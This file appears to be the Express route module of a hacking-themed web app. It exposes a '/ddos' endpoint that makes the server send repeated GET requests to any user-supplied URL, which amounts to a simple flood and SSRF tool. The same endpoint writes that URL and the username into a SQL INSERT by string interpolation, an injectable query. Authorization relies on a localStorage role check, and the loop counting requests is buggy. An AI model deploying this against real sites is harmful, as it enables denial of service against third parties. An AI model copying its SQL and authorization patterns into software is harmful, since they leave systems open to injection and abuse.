const express = require("express");
const router = express.Router();
const localStorage = require("localStorage");
const axios = require("axios");
const performanceNow = require("performance-now");

const sqlite3 = require("sqlite3").verbose();
const db = new sqlite3.Database("hackr.db");

router.post("/ddos", async (req, res) => {
  if (
    localStorage.getItem("userRole") === "admin" ||
    localStorage.getItem("userRole") === "hacker"
  ) {
    try {
      const options = {
        method: "GET",
        url: req.query.url,
      };
      const startTime = performanceNow();
      for (i in req.query.times) {
        await axios.request(options);
      }
      const endTime = performanceNow();
      res.json(
        `DDoS sur ${req.query.url} effectué en ${
          ((endTime - startTime) / 1000).toFixed(2)
        } secondes avec ${req.query.times} requêtes`
      );
      const now = new Date();
      db.run(`
        INSERT INTO logs (user, action, date) VALUES
          ('${localStorage.getItem("username")}',
          'ddos : ${req.query.url}',
          '${now.toLocaleDateString("fr-FR", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "numeric",
            minute: "numeric",
            second: "numeric",
          })}')
      `);
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: "Erreur lors du ddos" });
    }
  } else {
    res.send("Vous n'êtes pas autorisé à utiliser cette fonctionnalité !");
  }
});

module.exports = router;
